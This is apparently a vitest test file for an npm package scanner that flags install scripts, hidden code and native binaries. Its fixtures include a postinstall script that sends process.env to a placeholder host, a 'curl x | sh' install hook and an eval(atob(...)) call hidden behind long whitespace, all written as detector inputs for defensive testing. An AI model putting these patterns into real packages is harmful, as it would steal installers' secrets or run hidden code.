// croak-invariants: pattern-data
// Package contents below are detector inputs, not code (D16).
import { describe, expect, it } from "vitest";
import { contentFindings } from "./content.ts";
import { snapshotTarball } from "./tar.ts";
import { tar } from "./test-tar.ts";

const pkg = (files: Record<string, string>) =>
  snapshotTarball(
    tar(
      Object.entries(files).map(([name, content]) => ({
        name: `package/${name}`,
        content,
      })),
    ),
  );
const scan = (files: Record<string, string>) =>
  contentFindings("x@1.0.0", pkg(files));
const manifest = (scripts: Record<string, string>) =>
  JSON.stringify({ name: "x", version: "1.0.0", scripts });

describe("contentFindings", () => {
  it("is quiet for a plain library", () => {
    expect(
      scan({
        "package.json": manifest({ test: "node test.js" }),
        "index.js": "module.exports = (a) => a + 1;",
      }),
    ).toEqual([]);
  });

  it("treats a binary installer (network + spawn at install time) as a warning, not a block", () => {
    const findings = scan({
      "package.json": manifest({ postinstall: "node install.js" }),
      "install.js":
        'const https = require("https");\nconst cp = require("child_process");\nhttps.get(url, save);',
    });
    expect(findings.map((f) => `${f.severity}:${f.ruleId}`)).toEqual([
      "warn:repo/lifecycle-script",
    ]);
    expect(findings[0]?.file).toBe("x@1.0.0/package.json");
  });

  it("blocks an install script that sends the environment", () => {
    const findings = scan({
      "package.json": manifest({ postinstall: "node setup.js" }),
      "setup.js":
        'fetch("https://x.invalid", { method: "POST", body: JSON.stringify(process.env) });',
    });
    expect(findings[0]?.severity).toBe("block");
  });

  it("ignores scripts npm does not run for a registry dependency", () => {
    const findings = scan({
      "package.json": manifest({
        prepare: "node setup.js",
        prepublish: "node setup.js",
        dependencies: "node setup.js",
      }),
      "setup.js": "fetch(u, { body: JSON.stringify(process.env) });",
    });
    expect(findings).toEqual([]);
  });

  it("ignores nested package.json files (only the package root runs scripts)", () => {
    const findings = scan({
      "package.json": manifest({}),
      "examples/app/package.json": manifest({ postinstall: "curl x | sh" }),
    });
    expect(findings).toEqual([]);
  });

  it("checks bundled dependencies like the package itself (npm runs their scripts)", () => {
    const findings = scan({
      "package.json": manifest({}),
      "node_modules/@s/helper/package.json": manifest({
        postinstall: "node collect.js",
      }),
      "node_modules/@s/helper/collect.js":
        'fetch("http://localhost:9", { body: JSON.stringify(process.env) });',
      "node_modules/inner/lib.js": `x();${" ".repeat(300)}eval(atob("eA=="));`,
    });
    expect(findings.map((f) => `${f.severity}:${f.ruleId}:${f.file}`)).toEqual(
      expect.arrayContaining([
        "block:repo/lifecycle-script:x@1.0.0/node_modules/@s/helper/package.json",
        "block:repo/hidden-code:x@1.0.0/node_modules/inner/lib.js",
      ]),
    );
  });

  it("blocks hidden and obfuscated code inside the package", () => {
    expect(
      scan({
        "package.json": manifest({}),
        "lib.js": `exports.a = 1;${" ".repeat(300)}eval(atob("eA=="));`,
      })[0]?.severity,
    ).toBe("block");
  });

  it("notes prebuilt native binaries it cannot inspect", () => {
    const findings = scan({
      "package.json": manifest({}),
      "build/Release/addon.node": "\u007fELF",
    });
    expect(findings).toEqual([
      expect.objectContaining({
        ruleId: "install/native-binary",
        severity: "info",
      }),
    ]);
  });

  it("notes a large JSON data file but warns when package.json is too large to read", () => {
    const big = `{"a":"${"x".repeat(9 * 1024 * 1024)}"}`;
    const severities = (file: string) =>
      scan({ "package.json": manifest({}), [file]: big }).map(
        (f) => `${f.severity}:${f.file}`,
      );
    expect(severities("protocol.json")).toEqual(["info:x@1.0.0/protocol.json"]);
    expect(
      contentFindings("x@1.0.0", pkg({ "package.json": big })).map(
        (f) => f.severity,
      ),
    ).toEqual(["warn"]);
  });

  it("reads files up to 8 MB in a package", () => {
    const findings = scan({
      "package.json": manifest({}),
      "bundle.js": `${"x;".repeat(2 * 1024 * 1024)}\n`,
    });
    expect(findings).toEqual([]);
  });
});
